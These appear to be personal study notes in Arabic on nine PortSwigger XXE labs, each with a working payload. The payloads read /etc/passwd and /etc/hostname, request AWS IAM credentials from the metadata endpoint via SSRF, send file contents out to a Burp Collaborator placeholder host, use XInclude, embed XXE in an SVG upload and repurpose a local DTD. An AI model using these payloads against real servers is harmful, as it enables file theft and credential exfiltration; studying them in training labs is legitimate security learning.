
---

1) Lab: Exploiting XXE using external entities to retrieve files
	 ده لاب عادى  بتحط ده 
	 payload=> <!DOCTYPE data [
	    <!ENTITY xxe SYSTEM "file:///etc/passwd">
		]>
---
2) # Lab: Exploiting XXE to perform SSRF attacks 
	  بتدور فى صفحه المنتجات و تسشوف xml   
	 payload => <!DOCTYPE data [
    <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/">]> 
     id ده بتجيبه من الريسبونت وبيديك واحد بواحد 

---
3) Lab: Blind XXE with out-of-band interaction 
	 نوع الثغره ده Blind  مش بيظهر تفاعل فى الصفه فهنستخدم سيرفر خارجى بتاع البيرب 
	 payload=> <!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> ]> 
---
4) # Lab: Blind XXE with out-of-band interaction via XML parameter entities
	 انتا هنا عندك نوع الاب ده parameter  فهتستخدم % وتنادى جوه ال DTD  
	 pay load => 1. <!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> %xxe; ]>
---
5)  Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD
	السيرفر vulnerable لـ XXE، لكن مش بيرجع البيانات في الـ Response؛ لذلك بنخليه يحمل **External DTD**، والـ DTD يساعدنا في بناء الاستغلال، وبعدها البيانات تخرج من خلال **OOB interaction** نراقبه باستخدام **Burp Collaborator**.   
	 - وفى الاكسبلويت فى الاب هتكتب ده علشان توصل عليه <!ENTITY % file SYSTEM "file:///etc/hostname"> <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://BURP-COLLABORATOR-SUBDOMAIN/?x=%file;'>"> %eval; %exfil;  
	 - وبعدين هتيجى فى الريسبونس علشان الطلب يرجع فى بيرب كولابوريت 
	  1. `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>` 
---
6) # Lab: Exploiting blind XXE to retrieve data via error messages
	الا ده الاوت بوت بيتعرض فى الريسبونس 
	هتعرف ده فى الاكسبلويت 
	<!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>"> %eval; %exfil; 
	وبعدين فى البيرب هتكتب ده 
	<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>  
---
7) # Lab: Exploiting XInclude to retrieve files
	اللاب ده بينقلك من **XXE** لتقنية تانية اسمها **XInclude**، ودي مهمة لأن أحيانًا التطبيق بيستخدم XML Parser لكن **مش بيسمحلك تتحكم في الـ DOCTYPE**. 
	استغلال خاصية XInclude الموجودة في XML علشان نخلي السيرفر يقرأ ملف من نظام التشغيل.
	**XInclude** خاصية في XML تسمح بتضمين محتوى خارجي، واللاب بيستغلها لاسترجاع ملفات من السيرفر في الحالات التي قد لا يكون فيها استغلال XXE التقليدي باستخدام DOCTYPE متاحًا. 
	وهنا مش هتلاقى كود xml  بس هتلاقى القيم تحط الكود ده فى القيمه هو الكود ثابت ال بيتغير هو الحاجه ال عاوزها ال هو اسمه file  
	``` 
	<foo xmlns:xi="http://www.w3.org/2001/XInclude">
    <xi:include parse="text" href="FILE"/>
     </foo>
	```
---
8) Lab: Exploiting XXE via image file upload 
	الموقع بيسمحلك ترفع صورة، لكن فيه احتمال إن السيرفر بيستخدم مكتبة لمعالجة **SVG**.
	والـ **SVG في الأساس ملف XML**.
	يعني لو التطبيق بيقبل SVG، تقدر تحط داخله **XXE payload**، ولما السيرفر يحاول يعالج الصورة، الـ XML parser يفسر الـ XXE. 
	 ف انتا هتروح تكتب كومنت بي مكان الصوره هنعمل صوره ونحط فيها الكود الصوره نعملها ب nano 
	  ```
	  1. `<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>`
	  ```
	  وطبعا محتوى الملف لما تكتب الكومنت هتلاقيه مكتوب فى الصوره ال فى الكومنتات تاخدها كوبى وتفتحها 
--- 
9) # Lab: Exploiting XXE to retrieve data by repurposing a local DTD 
	 بدل ما ننشئ DTD جديد، بنستغل DTD موجود أصلًا على السيرفر، ونستفيد من تعريفات الـ Entities الموجودة فيه علشان نعمل XXE ونستخرج بيانات.
	 لكن في اللاب ده، التطبيق أو النظام عنده **DTD موجود بالفعل على الجهاز**.
	 ## ليه محتاجين Local DTD؟
	في بعض حالات XXE، الـ parser بيكون عامل قيود تمنعك من استخدام **external DTD من الإنترنت**.
	```
	<!DOCTYPE message [ <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd"> <!ENTITY % ISOamso ' <!ENTITY &#x25; file SYSTEM "file:///etc/passwd"> <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>"> &#x25;eval; &#x25;error; '> %local_dtd; ]>
	```
---
